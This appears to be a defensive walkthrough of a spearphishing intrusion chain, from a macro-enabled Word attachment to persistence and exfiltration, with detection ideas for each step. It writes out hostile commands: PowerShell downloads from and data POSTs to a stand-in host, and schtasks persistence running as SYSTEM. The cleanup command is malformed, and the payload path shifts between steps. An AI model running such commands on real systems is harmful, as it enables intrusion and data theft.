
1. **Email Delivery**
   - Application: Outlook
   - User Action: User receives a spearphishing email from a spoofed address (e.g., admin@fakecompany.com).
   - Key Artifacts: Email headers indicating spoofing, attachment named "Invoice_2023.docx".
   - Detection: Monitor for emails with suspicious "From" addresses and attachments with common spearphishing file types.

2. **User Interaction**
   - Application: Outlook
   - User Action: User opens the email and clicks on the attachment.
   - Key Artifacts: User clicks on "Enable Content" to allow macros.
   - Detection: Monitor for user interactions with attachments and enabling macros.

3. **Execution of Malicious Macro**
   - Application: Microsoft Word
   - User Action: The macro executes upon enabling content.
   - Key Artifacts: Macro code that downloads a payload from a remote server.
   - Detection: Monitor for processes spawned from Word that execute scripts or download files.

4. **Payload Download**
   - Application: PowerShell
   - User Action: The macro triggers a PowerShell command to download a malicious executable.
   - Key Artifacts: PowerShell command: `Invoke-WebRequest -Uri http://malicious.com/payload.exe -OutFile C:\Users\User\Downloads\payload.exe`
   - Detection: Monitor for PowerShell commands that download executables from suspicious URLs.

5. **Execution of Malicious Payload**
   - Application: Windows Explorer
   - User Action: User inadvertently executes the downloaded payload by double-clicking on it.
   - Key Artifacts: Executable file located at `C:\Users\User\Downloads\payload.exe`.
   - Detection: Monitor for execution of files from the Downloads directory, especially those with unusual names or signatures.

6. **Establishing Persistence**
   - Application: schtasks.exe
   - User Action: The malware creates a scheduled task to ensure persistence on system reboot.
   - Key Artifacts: Command executed: `schtasks /create /tn "UpdateService" /tr "C:\Users\User\AppData\Local\Temp\malicious.exe" /sc ONLOGON /ru "SYSTEM"`.
   - Detection: Monitor for the use of `schtasks.exe` to create tasks with unusual names or executing non-standard executables.

7. **Task Execution**
   - Application: Task Scheduler
   - User Action: The scheduled task executes the malicious payload upon user logon.
   - Key Artifacts: Task execution logs indicating the execution of `malicious.exe`.
   - Detection: Analyze logs for task execution events, particularly those that occur at odd intervals or times.

8. **Data Exfiltration**
   - Application: PowerShell
   - User Action: The malware uses PowerShell to exfiltrate sensitive data to a remote server.
   - Key Artifacts: PowerShell command: `Invoke-WebRequest -Uri http://malicious.com/exfiltrate -Method POST -Body $data`.
   - Detection: Monitor for PowerShell commands that send data to external servers, especially those with suspicious URLs.

9. **Cleanup and Obfuscation**
   - Application: schtasks.exe
   - User Action: The malware modifies the scheduled task to hide its presence.
   - Key Artifacts: Command executed: `schtasks /change /tn "UpdateService" /delete`.
   - Detection: Monitor for modifications to task metadata, such as deletions or changes to the Security Descriptor (SD) registry value.
